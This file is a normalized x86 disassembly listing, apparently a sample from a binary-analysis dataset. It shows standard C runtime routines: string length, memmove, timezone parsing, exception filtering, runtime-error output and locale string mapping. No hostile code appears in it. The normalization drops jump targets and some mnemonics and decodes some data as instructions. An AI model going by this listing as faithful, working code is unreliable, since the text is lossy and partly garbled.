je r-xdata
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
push 0x100
call sub_408e82
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_40d820
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_408dd6
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_408d94
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_408dd6
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_408e6a
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_40d900
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40d939
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_40d939
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40d939
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_40e5a0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_40e5a0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_40f5a0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40f5a0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_40f5b0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40f5b0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_40f5b0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40f690
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_40e5a0
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_4091e0
add esp 0x10
sub_40da8c
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_40db28
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40a30c
pop esi
retn 0x4
sub_40db40
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40dbd0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40dc30 ]
jmp [ ecx * 4 + jump_table_40dcac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40dd18 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40dd18 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40deb0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40ddb8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40deb0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40dd18 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40dd18 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40dd18 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40deb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40deb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40deb0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40deb0 ]
sub_40df31
push ecx
push ebx
push ebp
push esi
push edi
xor ebp ebp
or ebx 0xffffffff
push r--data
xor edi edi
mov [ rw-data ] ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_40f88b
mov esi eax
pop ecx
cmp esi ebp
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bp
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_4091a9
push esi
call sub_40e5a0
inc eax
push eax
call sub_408e82
add esp 0xc
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_40db40
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bp
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_40f5a0
push 0x3
push esi
push [ rw-data ]
call sub_4091e0
mov eax [ rw-data ]
add esi 0x3
add esp 0x14
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push esi
call sub_409430
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
push 0x1
inc esi
pop edi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebp
push 0x3f
mov edi 0x220
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebp
push 0x3f
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp edi ebp
je r-xdata
inc esi
push esi
call sub_409430
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_4091e0
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_409430
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_40e18f
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_40e33b
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_40e33b
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_40e33b
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_40e33b
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_40e33b
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_40e47b
inc [ rw-data ]
push 0x1000
call sub_408e82
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40e4e5
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40f908
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40f908
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor edx edx
mov ecx rw-data
push 0x1a
call sub_409a6f
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40e5a0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40e61b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_40e690
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40e700
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40e775
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_4094d0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_40f9f0
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40e8be
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_410052
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_4094d0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
